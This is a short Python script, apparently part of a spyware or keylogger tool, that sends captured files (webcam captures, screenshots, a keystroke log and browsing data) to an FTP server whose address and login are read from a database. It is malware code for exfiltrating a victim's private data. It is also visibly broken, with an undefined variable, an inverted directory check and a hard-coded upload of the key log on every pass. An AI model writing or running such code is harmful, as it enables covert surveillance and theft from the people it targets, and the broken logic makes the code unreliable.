import ftplib
import os
from getsqldata import *


def uploadFileFTP(sourceFilePath, destinationDirectory, server, username, password):
    myFTP = ftplib.FTP(server, username, password)
    if destinationDirectory in [name for name, data in list(remote.mlsd())]:
        print("Destination Directory does not exist. Creating it first")
        myFTP.mkd(destinationDirectory)
    # Changing Working Directory
    myFTP.cwd(destinationDirectory)
    if os.path.isfile(sourceFilePath):
        fh = open(sourceFilePath, 'rb')
        myFTP.storbinary('STOR %s' % f, fh)
        fh.close()
    else:
        print("Source File does not exist")


uid = getCurrentUser()
sv = getRowValue('FTPServer',uid)

dir_path = "./" # thu muc chua file can gui
# cac file can gui
files = ["Webcam.zip","Screenshot.zip","key_log.txt","Website.zip"]
#files = ['key_log.txt','acb.txt']
for f in files:  # add files to the message
    file_path = os.path.join(dir_path, f)
    if (os.path.exists(file_path)):
        uploadFileFTP('./key_log.txt',sv[4],sv[1],sv[2],sv[3])
    else:
        print(str(file_path) + " does not exists!!!")
